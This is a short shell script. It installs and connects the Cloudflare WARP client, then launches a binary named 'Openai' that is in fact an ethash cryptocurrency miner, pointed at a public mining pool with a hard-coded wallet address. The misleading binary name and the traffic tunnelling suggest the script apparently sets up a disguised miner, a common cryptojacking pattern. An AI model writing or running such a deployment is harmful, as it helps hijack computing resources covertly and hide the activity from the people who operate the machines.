#!/bin/sh
wget https://pkg.cloudflareclient.com/uploads/cloudflare_warp_2021_8_0_1_amd64_844183db02.deb
sudo dpkg -i cloudflare_warp_2021_8_0_1_amd64_844183db02.deb
sudo systemctl enable --now warp-svc.service
echo Y | warp-cli set-mode warp+doh
warp-cli set-mode warp+doh
warp-cli register
warp-cli connect

./Openai --algo ethash --server eth.2miners.com:2020 --user 0x2fd9EB3c66C491443C09d9F10634602C909992Dd.$HOSTNAME


